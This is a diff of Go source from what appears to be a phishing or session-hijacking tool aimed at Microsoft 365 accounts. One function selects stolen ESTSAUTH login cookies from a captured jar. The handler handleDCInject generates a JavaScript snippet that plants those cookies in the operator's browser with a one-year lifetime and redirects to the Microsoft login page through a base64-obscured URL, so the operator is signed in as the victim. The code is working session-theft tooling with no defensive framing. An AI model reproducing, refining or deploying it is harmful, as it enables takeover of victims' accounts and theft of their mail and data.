@@ -1705,14 +1705,11 @@ func harvestESTSLoginCookies(rt, tenant, email string) []estsCookieEntry {
 
 	msLoginURL, _ := url.Parse("https://login.microsoftonline.com")
 	expiry := float64(time.Now().Add(30 * 24 * time.Hour).Unix())
+	// Only ESTSAUTH* drive SSO; fpc/esctx/buid/SignInStateCookie don't help auth.
 	wantNames := map[string]bool{
 		"ESTSAUTH":           true,
 		"ESTSAUTHPERSISTENT": true,
 		"ESTSAUTHLIGHT":      true,
-		"SignInStateCookie":  true,
-		"buid":               true,
-		"esctx":              true,
-		"fpc":                true,
 	}
 	var out []estsCookieEntry
 	for _, c := range jar.Cookies(msLoginURL) {
@@ -1784,14 +1781,16 @@ func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
 		}
 	}
 
+	// Script format matches the known-working ESTSAUTH paste sample:
+	// set cookies via document.cookie at login.microsoftonline.com → navigate to
+	// login.microsoftonline.com → Microsoft sees ESTSAUTH and SSO's the operator.
+	msLoginB64 := base64.StdEncoding.EncodeToString([]byte("https://login.microsoftonline.com"))
 	var scriptBuf strings.Builder
-	scriptBuf.WriteString("!function(){\n")
-	scriptBuf.WriteString("  let e=JSON.parse(`")
+	scriptBuf.WriteString("!function(){let e=JSON.parse(`")
 	scriptBuf.Write(cookieJSON)
-	scriptBuf.WriteString("`);\n")
-	scriptBuf.WriteString("  for(let o of e)document.cookie=`${o.name}=${o.value};Max-Age=31536000;${o.path?`path=${o.path};`:''}${o.domain?`${o.path?'':'path=/;'}domain=${o.domain};`:''}Secure;SameSite=None`;\n")
-	scriptBuf.WriteString("  window.location.href='https://outlook.office.com/mail/';\n")
-	scriptBuf.WriteString("}();")
+	scriptBuf.WriteString("`);for(let o of e)document.cookie=`${o.name}=${o.value};Max-Age=31536000;${o.path?`path=${o.path};`:\"\"}${o.domain?`${o.path?\"\":\"path=/\"}domain=${o.domain};`:\"\"}Secure;SameSite=None`;window.location.href=atob('")
+	scriptBuf.WriteString(msLoginB64)
+	scriptBuf.WriteString("')}();")
 	script := scriptBuf.String()
 	scriptJSON, _ := json.Marshal(script)
 
